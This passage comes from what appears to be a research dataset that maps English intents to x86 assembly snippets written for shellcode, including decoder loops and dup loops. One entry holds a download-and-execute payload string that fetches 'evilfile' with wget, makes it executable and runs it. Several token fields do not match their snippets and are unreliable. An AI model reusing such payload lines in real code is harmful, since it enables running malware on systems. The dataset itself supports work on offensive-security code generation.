      "var0",
      "start",
      "shellcode"
    ],
    "snippet_tokens": [
      "lea",
      "var0",
      ",",
      "[",
      "esi",
      "]"
    ]
  },
  {
    "intent": "point edx to the next byte of the shellcode",
    "rewritten_intent": "point edx to the next byte of the shellcode",
    "snippet": "lea edx, [esi+1]",
    "slot_map": {
      "edx": "var0"
    },
    "intent_tokens": [
      "point",
      "var0",
      "next",
      "byte",
      "shellcode"
    ],
    "snippet_tokens": [
      "lea",
      "var0",
      ",",
      "[",
      "esi+1",
      "]"
    ]
  },
  {
    "intent": "load the effective address [esi+26] into edx",
    "rewritten_intent": "load the effective address [esi+26] into edx",
    "snippet": "lea edx, [esi+26]",
    "slot_map": {
      "esi+26": "var1",
      "[": "var0",
      "edx": "var2"
    },
    "intent_tokens": [
      "load",
      "effective",
      "address",
      "[",
      "var1",
      "]",
      "var2"
    ],
    "snippet_tokens": [
      "lea",
      "var0",
      ",",
      "[",
      "esi+1",
      "]"
    ]
  },
  {
    "intent": "load the effective address of the result of the operation [esi+26] into the edx register",
    "rewritten_intent": "load the effective address of the result of the operation [esi+26] into the edx register",
    "snippet": "lea edx, [esi+26]",
    "slot_map": {
      "esi+26": "var1",
      "[": "var0",
      "edx": "var2"
    },
    "intent_tokens": [
      "load",
      "effective",
      "address",
      "result",
      "operation",
      "[",
      "var1",
      "]",
      "var2",
      "register"
    ],
    "snippet_tokens": [
      "lea",
      "var0",
      ",",
      "[",
      "esi+1",
      "]"
    ]
  },
  {
    "intent": "load the effective address of the result of the operation [esi+30] into the edx register",
    "rewritten_intent": "load the effective address of the result of the operation [esi+30] into the edx register",
    "snippet": "lea edx, [esi+30]",
    "slot_map": {
      "esi+30": "var1",
      "[": "var0",
      "edx": "var2"
    },
    "intent_tokens": [
      "load",
      "effective",
      "address",
      "result",
      "operation",
      "[",
      "var1",
      "]",
      "var2",
      "register"
    ],
    "snippet_tokens": [
      "lea",
      "var0",
      ",",
      "[",
      "esi+1",
      "]"
    ]
  },
  {
    "intent": "load the effective address of the result of the operation [esi+47] into the edx register",
    "rewritten_intent": "load the effective address of the result of the operation [esi+47] into the edx register",
    "snippet": "lea edx, [esi+47]",
    "slot_map": {
      "esi+47": "var1",
      "[": "var0",
      "edx": "var2"
    },
    "intent_tokens": [
      "load",
      "effective",
      "address",
      "result",
      "operation",
      "[",
      "var1",
      "]",
      "var2",
      "register"
    ],
    "snippet_tokens": [
      "lea",
      "var0",
      ",",
      "[",
      "esi+1",
      "]"
    ]
  },
  {
    "intent": "load the effective address [ebp+20] into esi",
    "rewritten_intent": "load the effective address [ebp+20] into esi",
    "snippet": "lea esi, [ebp+20]",
    "slot_map": {
      "ebp+20": "var1",
      "[": "var0",
      "esi": "var2"
    },
    "intent_tokens": [
      "load",
      "effective",
      "address",
      "[",
      "var1",
      "]",
      "var2"
    ],
    "snippet_tokens": [
      "lea",
      "var0",
      ",",
      "[",
      "esi+1",
      "]"
    ]
  },
  {
    "intent": "load the effective address of the result of the operation [ebp+20] into the esi register",
    "rewritten_intent": "load the effective address of the result of the operation [ebp+20] into the esi register",
    "snippet": "lea esi, [ebp+20]",
    "slot_map": {
      "ebp+20": "var1",
      "[": "var0",
      "esi": "var2"
    },
    "intent_tokens": [
      "load",
      "effective",
      "address",
      "result",
      "operation",
      "[",
      "var1",
      "]",
      "var2",
      "register"
    ],
    "snippet_tokens": [
      "lea",
      "var0",
      ",",
      "[",
      "esi+1",
      "]"
    ]
  },
  {
    "intent": "load the effective address of the result of the operation [esi +4] into the esi register",
    "rewritten_intent": "load the effective address of the result of the operation [esi +4] into the esi register",
    "snippet": "lea esi, [esi +4]",
    "slot_map": {
      "esi +4": "var1",
      "[": "var0"
    },
    "intent_tokens": [
      "load",
      "effective",
      "address",
      "result",
      "operation",
      "[",
      "var1",
      "]",
      "esi",
      "register"
    ],
    "snippet_tokens": [
      "lea",
      "var0",
      ",",
      "[",
      "esi+1",
      "]"
    ]
  },
  {
    "intent": "load the value of register ebx into register esp",
    "rewritten_intent": "load the value of register ebx into register esp",
    "snippet": "lea esp, [ebx]",
    "slot_map": {
      "ebx": "var0"
    },
    "intent_tokens": [
      "load",
      "value",
      "register",
      "var0",
      "register",
      "esp"
    ],
    "snippet_tokens": [
      "lea",
      "esp",
      ",",
      "[",
      "var0",
      "]"
    ]
  },
  {
    "intent": "define len equal to the length of msg",
    "rewritten_intent": "define len equal to the length of msg",
    "snippet": "len equ $ - msg",
    "slot_map": {
      "len": "var0"
    },
    "intent_tokens": [
      "define",
      "var0",
      "equal",
      "length",
      "msg"
    ],
    "snippet_tokens": [
      "var0",
      "equ",
      "$",
      "-",
      "msg"
    ]
  },
  {
    "intent": "define len equal to the lenght of the encodedshellcode array",
    "rewritten_intent": "define len equal to the lenght of the encodedshellcode array",
    "snippet": "len equ $-encodedshellcode",
    "slot_map": {
      "len": "var0",
      "lenght": "var1",
      "encodedshellcode": "var2"
    },
    "intent_tokens": [
      "define",
      "var0",
      "equal",
      "var1",
      "var2",
      "array"
    ],
    "snippet_tokens": [
      "var0",
      "equ",
      "$",
      "-encodedshellcode"
    ]
  },
  {
    "intent": "declare the len label equal to the size of the google variable",
    "rewritten_intent": "declare the len label equal to the size of the google variable",
    "snippet": "len: equ $-google",
    "slot_map": {
      "len": "var0"
    },
    "intent_tokens": [
      "declare",
      "var0",
      "label",
      "equal",
      "size",
      "google",
      "variable"
    ],
    "snippet_tokens": [
      "var0",
      ":",
      "equ",
      "$",
      "-google"
    ]
  },
  {
    "intent": "declare the len label equal to the length of shellcode",
    "rewritten_intent": "declare the len label equal to the length of shellcode",
    "snippet": "len: equ $-shellcode",
    "slot_map": {
      "len": "var0"
    },
    "intent_tokens": [
      "declare",
      "var0",
      "label",
      "equal",
      "length",
      "shellcode"
    ],
    "snippet_tokens": [
      "var0",
      ":",
      "equ",
      "$",
      "-shellcode"
    ]
  },
  {
    "intent": "allocate a single byte of memory and initialize it to the letter 'c'",
    "rewritten_intent": "allocate a single byte of memory and initialize it to the letter 'c'",
    "snippet": "letter_c db 'c'",
    "slot_map": {
      "'c'": "var0"
    },
    "intent_tokens": [
      "allocate",
      "single",
      "byte",
      "memory",
      "and",
      "initialize",
      "it",
      "letter",
      "var0"
    ],
    "snippet_tokens": [
      "letter_c",
      "db",
      "var0"
    ]
  },
  {
    "intent": "define line as the byte string '/usr/bin/wget http://127.0.0.1:8080/evilfile && /bin/chmod 777 evilfile && ./evilfile', 0x0a",
    "rewritten_intent": "define line as the byte string '/usr/bin/wget http://127.0.0.1:8080/evilfile && /bin/chmod 777 evilfile && ./evilfile', 0x0a",
    "snippet": "line db '/usr/bin/wget http://127.0.0.1:8080/evilfile && /bin/chmod 777 evilfile && ./evilfile', 0x0a",
    "slot_map": {
      "'/usr/bin/wget http://127.0.0.1:8080/evilfile && /bin/chmod 777 evilfile && ./evilfile'": "var0",
      ", 0x0a": "var1",
      "0x0a": "var2"
    },
    "intent_tokens": [
      "define",
      "line",
      "byte",
      "string",
      "var0var1"
    ],
    "snippet_tokens": [
      "line",
      "db",
      "var0",
      ",",
      "var2"
    ]
  },
  {
    "intent": "declare the loader label",
    "rewritten_intent": "declare the loader label",
    "snippet": "loader:",
    "slot_map": {},
    "intent_tokens": [
      "declare",
      "loader",
      "label"
    ],
    "snippet_tokens": [
      "loader",
      ":"
    ]
  },
  {
    "intent": "decrement the counter and jump to .3 label if the count is not zero",
    "rewritten_intent": "decrement the counter and jump to .3 label if the count is not zero",
    "snippet": "loop .3",
    "slot_map": {},
    "intent_tokens": [
      "decrement",
      "counter",
      "and",
      "jump",
      ".3",
      "label",
      "if",
      "count",
      "not",
      "zero"
    ],
    "snippet_tokens": [
      "loop",
      ".3"
    ]
  },
  {
    "intent": "decrement ecx and jumps to the 3 label unless decrementing ecx caused its value to become zero",
    "rewritten_intent": "decrement ecx and jumps to the 3 label unless decrementing ecx caused its value to become zero",
    "snippet": "loop 3",
    "slot_map": {
      "ecx": "var0",
      "unless": "var2",
      "decrementing": "var3"
    },
    "intent_tokens": [
      "decrement",
      "var0",
      "and",
      "jumps",
      "3",
      "label",
      "var2",
      "var3",
      "var0",
      "caused",
      "its",
      "value",
      "become",
      "zero"
    ],
    "snippet_tokens": [
      "loop",
      "3"
    ]
  },
  {
    "intent": "decrement the ecx register and jump to the bucle label if the counter is not zero",
    "rewritten_intent": "decrement the ecx register and jump to the bucle label if the counter is not zero",
    "snippet": "loop bucle",
    "slot_map": {
      "ecx": "var0",
      "bucle": "var1"
    },
    "intent_tokens": [
      "decrement",
      "var0",
      "register",
      "and",
      "jump",
      "var1",
      "label",
      "if",
      "counter",
      "not",
      "zero"
    ],
    "snippet_tokens": [
      "loop",
      "var1"
    ]
  },
  {
    "intent": "decrement the count register and jump to check_even_odd if the count is not equal to zero",
    "rewritten_intent": "decrement the count register and jump to check_even_odd if the count is not equal to zero",
    "snippet": "loop check_even_odd",
    "slot_map": {
      "check_even_odd": "var0"
    },
    "intent_tokens": [
      "decrement",
      "count",
      "register",
      "and",
      "jump",
      "var0",
      "if",
      "count",
      "not",
      "equal",
      "zero"
    ],
    "snippet_tokens": [
      "loop",
      "var0"
    ]
  },
  {
    "intent": "decrement the ecx register and jump to the check_even_odd label if the contents of the ecx register is not zero else jump short to the shellcode label",
    "rewritten_intent": "decrement the ecx register and jump to the check_even_odd label if the contents of the ecx register is not zero else jump short to the shellcode label",
    "snippet": "loop check_even_odd \\n jmp short shellcode",
    "slot_map": {
      "check_even_odd": "var2",
      "ecx": "var0"
    },
    "intent_tokens": [
      "decrement",
      "var0",
      "register",
      "and",
      "jump",
      "var2",
      "label",
      "if",
      "contents",
      "var0",
      "register",
      "not",
      "zero",
      "else",
      "jump",
      "short",
      "shellcode",
      "label"
    ],
    "snippet_tokens": [
      "loop",
      "var2",
      "\\n",
      "jmp",
      "short",
      "shellcode"
    ]
  },
  {
    "intent": "decrement the ecx register and jump to the decrypt label if the contents of the ecx register is not zero else jump short to the encrypt label",
    "rewritten_intent": "decrement the ecx register and jump to the decrypt label if the contents of the ecx register is not zero else jump short to the encrypt label",
    "snippet": "loop decrypt \\n jmp encrypt",
    "slot_map": {
      "ecx": "var0"
    },
    "intent_tokens": [
      "decrement",
      "var0",
      "register",
      "and",
      "jump",
      "decrypt",
      "label",
      "if",
      "contents",
      "var0",
      "register",
      "not",
      "zero",
      "else",
      "jump",
      "short",
      "encrypt",
      "label"
    ],
    "snippet_tokens": [
      "loop",
      "decrypt",
      "\\n",
      "jmp",
      "encrypt"
    ]
  },
  {
    "intent": "decrement ecx and jumps to the do_dup label unless decrementing ecx caused its value to become zero",
    "rewritten_intent": "decrement ecx and jumps to the do_dup label unless decrementing ecx caused its value to become zero",
    "snippet": "loop do_dup",
    "slot_map": {
      "do_dup": "var2",
      "ecx": "var0",
      "unless": "var3",
      "decrementing": "var4"
    },
    "intent_tokens": [
      "decrement",
      "var0",
      "and",
      "jumps",
      "var2",
      "label",
      "var3",
      "var4",
      "var0",
      "caused",
      "its",
      "value",
      "become",
      "zero"
    ],
    "snippet_tokens": [
      "loop",
      "var2"
    ]
  },
  {
    "intent": "decrement the counter and jump to the do_dup label if the count is not zero",
    "rewritten_intent": "decrement the counter and jump to the do_dup label if the count is not zero",
    "snippet": "loop do_dup",
    "slot_map": {
      "do_dup": "var0"
    },
    "intent_tokens": [
      "decrement",
      "counter",
      "and",
      "jump",
      "var0",
      "label",
      "if",
      "count",
      "not",
      "zero"
    ],
    "snippet_tokens": [
      "loop",
      "var0"
    ]
  },
  {
    "intent": "decrement the ecx register and jump to the do_dup label if the contents of the ecx register is not zero else push the byte 0x3f onto the stack",
    "rewritten_intent": "decrement the ecx register and jump to the do_dup label if the contents of the ecx register is not zero else push the byte 0x3f onto the stack",
    "snippet": "loop do_dup \\n push byte 0x3f",
    "slot_map": {
      "do_dup": "var2",
      "0x3f": "var3",
      "ecx": "var0"
    },
    "intent_tokens": [
      "decrement",
      "var0",
      "register",
      "and",
      "jump",
      "var2",
      "label",
      "if",
      "contents",
      "var0",
      "register",
      "not",
      "zero",
      "else",
      "push",
      "byte",
      "var3",
      "stack"
    ],
    "snippet_tokens": [
      "loop",
      "var2",
      "\\n",
      "push",
      "byte",
      "var3"
    ]
  },
  {
    "intent": "decrement ecx and jumps to the fill label unless decrementing ecx caused its value to become zero",
    "rewritten_intent": "decrement ecx and jumps to the fill label unless decrementing ecx caused its value to become zero",
    "snippet": "loop fill",
    "slot_map": {
      "ecx": "var0",
      "unless": "var2",
      "decrementing": "var3"
    },
    "intent_tokens": [
      "decrement",
      "var0",
      "and",
      "jumps",
      "fill",
      "label",
      "var2",
      "var3",
      "var0",
      "caused",
      "its",
      "value",
      "become",
      "zero"
    ],
    "snippet_tokens": [
      "loop",
      "fill"
    ]
  },
  {
    "intent": "decrement the counter and jump to the fill label if the count is not zero",
    "rewritten_intent": "decrement the counter and jump to the fill label if the count is not zero",
    "snippet": "loop fill",
    "slot_map": {},
    "intent_tokens": [
      "decrement",
      "counter",
      "and",
      "jump",
      "fill",
      "label",
      "if",
      "count",
      "not",
      "zero"
    ],
    "snippet_tokens": [
      "loop",
      "fill"
    ]
  },
  {
    "intent": "decrement the ecx register and jump to the fill label if the contents of the ecx register is not zero else move the contents of the esp register into the ecx register",
    "rewritten_intent": "decrement the ecx register and jump to the fill label if the contents of the ecx register is not zero else move the contents of the esp register into the ecx register",
    "snippet": "loop fill \\n mov ecx, esp",
    "slot_map": {
      "ecx": "var0"
    },
    "intent_tokens": [
      "decrement",
      "var0",
      "register",
      "and",
      "jump",
      "fill",
      "label",
      "if",
      "contents",
      "var0",
      "register",
      "not",
      "zero",
      "else",
      "move",
      "contents",
      "esp",
      "register",
      "var0",
      "register"
    ],
    "snippet_tokens": [
      "loop",
      "fill",
      "\\n",
      "mov",
      "var0",
      ",",
      "esp"
    ]
  },
  {
    "intent": "decrement the ecx register and jump to the l1 label if the contents of the ecx register is not zero else move the contents of the esp register into the eax register",
    "rewritten_intent": "decrement the ecx register and jump to the l1 label if the contents of the ecx register is not zero else move the contents of the esp register into the eax register",
    "snippet": "loop l1 \\n mov eax, esp",
    "slot_map": {
      "ecx": "var0",
      "l1": "var2",
      "eax": "var3"
    },
    "intent_tokens": [
      "decrement",
      "var0",
      "register",
      "and",
      "jump",
      "var2",
      "label",
      "if",
      "contents",
      "var0",
      "register",
      "not",
      "zero",
      "else",
      "move",
      "contents",
      "esp",
      "register",
      "var3",
      "register"
    ],
    "snippet_tokens": [
      "loop",
      "var2",
      "\\n",
      "mov",
      "var3",
      ",",
      "esp"
    ]
  },
  {
    "intent": "decrement the ecx register and jump to the l1 label if the contents of the ecx register is not zero else point the eax register to the stack register",
    "rewritten_intent": "decrement the ecx register and jump to the l1 label if the contents of the ecx register is not zero else point the eax register to the stack register",
    "snippet": "loop l1 \\n mov eax, esp",
    "slot_map": {
      "ecx": "var0",
      "l1": "var2",
      "eax": "var3"
    },
    "intent_tokens": [
      "decrement",
      "var0",
      "register",
      "and",
      "jump",
      "var2",
      "label",
      "if",
      "contents",
      "var0",
      "register",
      "not",
      "zero",
      "else",
      "point",
      "var3",
      "register",
      "stack",
      "register"
    ],
    "snippet_tokens": [
      "loop",
      "var2",
      "\\n",
      "mov",
      "var3",
      ",",
      "esp"
    ]
  },
  {
    "intent": "decrement the ecx register and jump to the l2 label if the contents of the ecx register is not zero else jump to the edi register",
    "rewritten_intent": "decrement the ecx register and jump to the l2 label if the contents of the ecx register is not zero else jump to the edi register",
    "snippet": "loop l2 \\n jmp edi",
    "slot_map": {
      "ecx": "var0",
      "l2": "var2",
      "edi": "var3"
    },
    "intent_tokens": [
      "decrement",
      "var0",
      "register",
      "and",
      "jump",
      "var2",
      "label",
      "if",
      "contents",
      "var0",
      "register",
      "not",
      "zero",
      "else",
      "jump",
      "var3",
      "register"
    ],
    "snippet_tokens": [
      "loop",
      "var2",
      "\\n",
      "jmp",
      "var3"
    ]
  },
  {
    "intent": "decrement the ecx register and jump to the l2 label if the contents of the ecx register is not zero else move the contents of the esp register into the ebx register",
    "rewritten_intent": "decrement the ecx register and jump to the l2 label if the contents of the ecx register is not zero else move the contents of the esp register into the ebx register",
    "snippet": "loop l2 \\n mov ebx, esp",
    "slot_map": {
      "ecx": "var0",
      "l2": "var2",
      "ebx": "var3"
    },
    "intent_tokens": [
      "decrement",
      "var0",
      "register",
      "and",
      "jump",
      "var2",
      "label",
      "if",
      "contents",
      "var0",
      "register",
      "not",
      "zero",
      "else",
      "move",
      "contents",
      "esp",
      "register",
      "var3",
      "register"
    ],
    "snippet_tokens": [
      "loop",
      "var2",
      "\\n",
      "mov",
      "var3",
      ",",
      "esp"
    ]
  },
  {
    "intent": "decrement the ecx register and jump to the l2 label if the contents of the ecx register is not zero else point the ebx register to the stack register",
    "rewritten_intent": "decrement the ecx register and jump to the l2 label if the contents of the ecx register is not zero else point the ebx register to the stack register",
    "snippet": "loop l2 \\n mov ebx, esp",
    "slot_map": {
      "ecx": "var0",
      "l2": "var2",
      "ebx": "var3"
    },
    "intent_tokens": [
      "decrement",
      "var0",
      "register",
      "and",
      "jump",
      "var2",
      "label",
      "if",
      "contents",
      "var0",
      "register",
      "not",
      "zero",
      "else",
      "point",
      "var3",
      "register",
      "stack",
      "register"
    ],
    "snippet_tokens": [
      "loop",
      "var2",
      "\\n",
      "mov",
      "var3",
      ",",
      "esp"
    ]
  },
  {
    "intent": "decrement the ecx register and jump to the l3 label if the contents of the ecx register is not zero else move the contents of the esp register into the ecx register",
    "rewritten_intent": "decrement the ecx register and jump to the l3 label if the contents of the ecx register is not zero else move the contents of the esp register into the ecx register",
    "snippet": "loop l3 \\n mov ecx, esp",
    "slot_map": {
      "ecx": "var0",
      "l3": "var3"
    },
    "intent_tokens": [
      "decrement",
      "var0",
      "register",
      "and",
      "jump",
      "var3",
      "label",
      "if",
      "contents",
      "var0",
      "register",
      "not",
      "zero",
      "else",
      "move",
      "contents",
      "esp",
      "register",
      "var0",
      "register"
    ],
    "snippet_tokens": [
      "loop",
      "var3",
      "\\n",
      "mov",
      "var0",
      ",",
      "esp"
    ]
  },
  {
    "intent": "decrement the ecx register and jump to the l3 label if the contents of the ecx register is not zero else point the ecx register to the stack register",
    "rewritten_intent": "decrement the ecx register and jump to the l3 label if the contents of the ecx register is not zero else point the ecx register to the stack register",
    "snippet": "loop l3 \\n mov ecx, esp",
    "slot_map": {
      "ecx": "var0",
      "l3": "var3"
    },
    "intent_tokens": [
      "decrement",
      "var0",
      "register",
      "and",
      "jump",
      "var3",
      "label",
      "if",
      "contents",
      "var0",
      "register",
      "not",
      "zero",
      "else",
      "point",
      "var0",
      "register",
      "stack",
      "register"
    ],
    "snippet_tokens": [
      "loop",
      "var3",
      "\\n",
      "mov",
      "var0",
      ",",
      "esp"
    ]
  },
  {
    "intent": "decrement the ecx register and jump to the l4 label if the contents of the ecx register is not zero else move the contents of the esp register into the edx register",
    "rewritten_intent": "decrement the ecx register and jump to the l4 label if the contents of the ecx register is not zero else move the contents of the esp register into the edx register",
    "snippet": "loop l4 \\n mov edx, esp",
    "slot_map": {
      "ecx": "var0",
      "l4": "var2",
      "edx": "var3"
    },
    "intent_tokens": [
      "decrement",
      "var0",
      "register",
      "and",
      "jump",
      "var2",
      "label",
      "if",
      "contents",
      "var0",
      "register",
      "not",
      "zero",
      "else",
      "move",
      "contents",
      "esp",
      "register",
      "var3",
      "register"
    ],
    "snippet_tokens": [
      "loop",
      "var2",
      "\\n",
      "mov",
      "var3",
      ",",
      "esp"
    ]
  },
  {
    "intent": "decrement the ecx register and jump to the l4 label if the contents of the ecx register is not zero else point the edx register to the stack register",
    "rewritten_intent": "decrement the ecx register and jump to the l4 label if the contents of the ecx register is not zero else point the edx register to the stack register",
    "snippet": "loop l4 \\n mov edx, esp",
    "slot_map": {
      "ecx": "var0",
      "l4": "var2",
      "edx": "var3"
    },
    "intent_tokens": [
      "decrement",
      "var0",
      "register",
      "and",
      "jump",
      "var2",
      "label",
      "if",
      "contents",
      "var0",
      "register",
      "not",
      "zero",
      "else",
      "point",
      "var3",
      "register",
      "stack",
      "register"
    ],
    "snippet_tokens": [
      "loop",
      "var2",
      "\\n",
      "mov",
      "var3",
      ",",
      "esp"
    ]
  },
  {
    "intent": "decrement ecx and jumps to the main_inc label unless decrementing ecx caused its value to become zero",
    "rewritten_intent": "decrement ecx and jumps to the main_inc label unless decrementing ecx caused its value to become zero",
    "snippet": "loop main_inc",
    "slot_map": {
      "main_inc": "var2",
      "ecx": "var0",
      "unless": "var3",
      "decrementing": "var4"
    },
    "intent_tokens": [
      "decrement",
      "var0",
      "and",
      "jumps",
      "var2",
      "label",
      "var3",
      "var4",
      "var0",
      "caused",
      "its",
      "value",
      "become",
      "zero"
    ],
    "snippet_tokens": [
      "loop",
      "var2"
    ]
  },
  {
    "intent": "decrement the ecx register and jump to the main_inc label if the contents of the ecx register is not zero else move the contents of the esp register into the ebx register",
    "rewritten_intent": "decrement the ecx register and jump to the main_inc label if the contents of the ecx register is not zero else move the contents of the esp register into the ebx register",
    "snippet": "loop main_inc \\n mov ebx, esp",
    "slot_map": {
      "main_inc": "var2",
      "ecx": "var0",
      "ebx": "var3"
    },
    "intent_tokens": [
      "decrement",
      "var0",
      "register",
      "and",
      "jump",
      "var2",
      "label",
      "if",
      "contents",
      "var0",
      "register",
      "not",
      "zero",
      "else",
      "move",
      "contents",
      "esp",
      "register",
      "var3",
      "register"
    ],
    "snippet_tokens": [
      "loop",
      "var2",
      "\\n",
      "mov",
      "var3",
      ",",
      "esp"
    ]
  },
  {
    "intent": "decrement the ecx register and jump to the main_inc label if the contents of the ecx register is not zero else point the ebx register to the stack register",
    "rewritten_intent": "decrement the ecx register and jump to the main_inc label if the contents of the ecx register is not zero else point the ebx register to the stack register",
    "snippet": "loop main_inc \\n mov ebx, esp",
    "slot_map": {
      "main_inc": "var2",
      "ecx": "var0",
      "ebx": "var3"
    },
    "intent_tokens": [
      "decrement",
      "var0",
      "register",
      "and",
      "jump",
      "var2",
      "label",
      "if",
      "contents",
      "var0",
      "register",
      "not",
      "zero",
      "else",
      "point",
      "var3",
      "register",
      "stack",
      "register"
    ],
    "snippet_tokens": [
      "loop",
      "var2",
      "\\n",
      "mov",
      "var3",
      ",",
      "esp"
    ]
  },
  {
    "intent": "decrement the counter and jump to the main_loop label if the count is not zero",
    "rewritten_intent": "decrement the counter and jump to the main_loop label if the count is not zero",
    "snippet": "loop main_loop",
    "slot_map": {
      "main_loop": "var0"
    },
    "intent_tokens": [
      "decrement",
      "counter",
      "and",
      "jump",
      "var0",
      "label",
      "if",
      "count",
      "not",
      "zero"
    ],
    "snippet_tokens": [
      "loop",
      "var0"
    ]
  },
  {
    "intent": "decrement ecx and jumps to the main_push label unless decrementing ecx caused its value to become zero",
    "rewritten_intent": "decrement ecx and jumps to the main_push label unless decrementing ecx caused its value to become zero",
    "snippet": "loop main_push",
    "slot_map": {
      "main_push": "var2",
      "ecx": "var0",
      "unless": "var3",
      "decrementing": "var4"
    },
    "intent_tokens": [
      "decrement",
      "var0",
      "and",
      "jumps",
      "var2",
      "label",
      "var3",
      "var4",
      "var0",
      "caused",
      "its",
      "value",
      "become",
      "zero"
    ],
    "snippet_tokens": [
      "loop",
      "var2"
    ]
  },
  {
    "intent": "decrement the ecx register and jump to the main_push label if the contents of the ecx register is not zero else move the value 30 into the cl register",
    "rewritten_intent": "decrement the ecx register and jump to the main_push label if the contents of the ecx register is not zero else move the value 30 into the cl register",
    "snippet": "loop main_push \\n mov cl, 30",
    "slot_map": {
      "main_push": "var2",
      "ecx": "var0"
    },
    "intent_tokens": [
      "decrement",
      "var0",
      "register",
      "and",
      "jump",
      "var2",
      "label",
      "if",
      "contents",
      "var0",
      "register",
      "not",
      "zero",
      "else",
      "move",
      "value",
      "30",
      "cl",
      "register"
    ],
    "snippet_tokens": [
      "loop",
      "var2",
      "\\n",
      "mov",
      "cl",
      ",",
      "30"
    ]
  },
  {
    "intent": "decrement the ecx register and jump to the ROT_decode label if the contents of the ecx register is not zero else jump short to the Shellcode label",
    "rewritten_intent": "decrement the ecx register and jump to the ROT_decode label if the contents of the ecx register is not zero else jump short to the Shellcode label",
    "snippet": "loop ROT_decode \\n jmp short Shellcode",
    "slot_map": {
      "ROT_decode": "var2",
      "Shellcode": "var3",
      "ecx": "var0"
    },
    "intent_tokens": [
      "decrement",
      "var0",
      "register",
      "and",
      "jump",
      "var2",
      "label",
      "if",
      "contents",
      "var0",
      "register",
      "not",
      "zero",
      "else",
      "jump",
      "short",
      "var3",
      "label"
    ],
    "snippet_tokens": [
      "loop",
      "var2",
      "\\n",
      "jmp",
      "short",
      "var3"
    ]
  },
  {
    "intent": "decrement ecx and jumps to the up label unless decrementing ecx caused its value to become zero",
    "rewritten_intent": "decrement ecx and jumps to the up label unless decrementing ecx caused its value to become zero",
    "snippet": "loop up",
    "slot_map": {
      "ecx": "var0",
      "unless": "var2",
      "decrementing": "var3"
    },
    "intent_tokens": [
      "decrement",
      "var0",
      "and",
      "jumps",
      "up",
      "label",
      "var2",
      "var3",
      "var0",
      "caused",
      "its",
      "value",
      "become",
      "zero"
    ],
    "snippet_tokens": [
      "loop",
      "up"
    ]
  },
  {
    "intent": "declare the loop label",
    "rewritten_intent": "declare the loop label",
    "snippet": "loop:",
    "slot_map": {},
    "intent_tokens": [
      "declare",
      "loop",
      "label"
    ],
    "snippet_tokens": [
      "loop",
      ":"
    ]
  },
  {
    "intent": "define the loop label",
    "rewritten_intent": "define the loop label",
    "snippet": "loop:",
    "slot_map": {},
    "intent_tokens": [
      "define",
      "loop",
      "label"
    ],
    "snippet_tokens": [
      "loop",
      ":"
    ]
  },
  {
    "intent": "declare the loopinghere label",
    "rewritten_intent": "declare the loopinghere label",
    "snippet": "loopinghere:",
    "slot_map": {
      "loopinghere": "var0"
    },
    "intent_tokens": [
      "declare",
      "var0",
      "label"
    ],
    "snippet_tokens": [
      "var0",
      ":"
    ]
  },
  {
    "intent": "decrement ecx and jumps to the decode label if the contens of ecx is not zero and the zero flag is set to zero",
    "rewritten_intent": "decrement ecx and jumps to the decode label if the contens of ecx is not zero and the zero flag is set to zero",
    "snippet": "loopnz decode",
    "slot_map": {
      "ecx": "var0",
      "contens": "var2"
    },
    "intent_tokens": [
      "decrement",
      "var0",
      "and",
      "jumps",
      "decode",
      "label",
      "if",
      "var2",
      "var0",
      "not",
      "zero",
      "and",
      "zero",
      "flag",
      "set",
      "zero"
    ],
    "snippet_tokens": [
      "loopnz",
      "decode"
    ]
  },
  {
    "intent": "decrement the counter and jump to the L1 label if the count is not zero and the zero flag is equal to zero",
    "rewritten_intent": "decrement the counter and jump to the L1 label if the count is not zero and the zero flag is equal to zero",
    "snippet": "loopnz L1",
    "slot_map": {
      "L1": "var0"
    },
    "intent_tokens": [
      "decrement",
      "counter",
      "and",
      "jump",
      "var0",
      "label",
      "if",
      "count",
      "not",
      "zero",
      "and",
      "zero",
      "flag",
      "equal",
      "zero"
    ],
    "snippet_tokens": [
      "loopnz",
      "var0"
    ]
  },
  {
    "intent": "decrement the ecx register and jump to the L1 label if the contents of the ecx register is not zero and the zero flag is zero else jump to the shellcode label",
    "rewritten_intent": "decrement the ecx register and jump to the L1 label if the contents of the ecx register is not zero and the zero flag is zero else jump to the shellcode label",
    "snippet": "loopnz L1 \\n jmp shellcode",
    "slot_map": {
      "L1": "var2",
      "ecx": "var0"
    },
    "intent_tokens": [
      "decrement",
      "var0",
      "register",
      "and",
      "jump",
      "var2",
      "label",
      "if",
      "contents",
      "var0",
      "register",
      "not",
      "zero",
      "and",
      "zero",
      "flag",
      "zero",
      "else",
      "jump",
      "shellcode",
      "label"
    ],
    "snippet_tokens": [
      "loopnz",
      "var2",
      "\\n",
      "jmp",
      "shellcode"
    ]
  },
  {
    "intent": "decrement the counter and jump to the L2 label if the count is not zero and the zero flag is set to zero",
    "rewritten_intent": "decrement the counter and jump to the L2 label if the count is not zero and the zero flag is set to zero",
    "snippet": "loopnz L2",
    "slot_map": {
      "L2": "var0"
    },
    "intent_tokens": [
      "decrement",
      "counter",
      "and",
      "jump",
      "var0",
      "label",
      "if",
      "count",
      "not",
      "zero",
      "and",
      "zero",
      "flag",
      "set",
      "zero"
    ],
    "snippet_tokens": [
      "loopnz",
      "var0"
    ]
  },
  {
    "intent": "decrement the ecx register and jump to the L2 label if the contents of the ecx register is not zero and the zero flag is zero else push the contents of the eax register onto the stack",
    "rewritten_intent": "decrement the ecx register and jump to the L2 label if the contents of the ecx register is not zero and the zero flag is zero else push the contents of the eax register onto the stack",
    "snippet": "loopnz L2 \\n push eax",
    "slot_map": {
      "L2": "var2",
      "ecx": "var0",
      "eax": "var3"
    },
    "intent_tokens": [
      "decrement",
      "var0",
      "register",
      "and",
      "jump",
      "var2",
      "label",
      "if",
      "contents",
      "var0",
      "register",
      "not",
      "zero",
      "and",
      "zero",
      "flag",
      "zero",
      "else",
      "push",
      "contents",
      "var3",
      "register",
      "stack"
    ],
    "snippet_tokens": [
      "loopnz",
      "var2",
      "\\n",
      "push",
      "var3"
    ]
  },
  {
    "intent": "decrement the ecx register and jump to the L3 label if the contents of the ecx register is not zero and the zero flag is zero else move the value 7 into the edx register",
    "rewritten_intent": "decrement the ecx register and jump to the L3 label if the contents of the ecx register is not zero and the zero flag is zero else move the value 7 into the edx register",
    "snippet": "loopnz L3 \\n mov edx, 7",
    "slot_map": {
      "L3": "var2",
      "ecx": "var0",
      "edx": "var3"
    },
    "intent_tokens": [
      "decrement",
      "var0",
      "register",
      "and",
      "jump",
      "var2",
      "label",
      "if",
      "contents",
      "var0",
      "register",
      "not",
      "zero",
      "and",
      "zero",
      "flag",
      "zero",
      "else",
      "move",
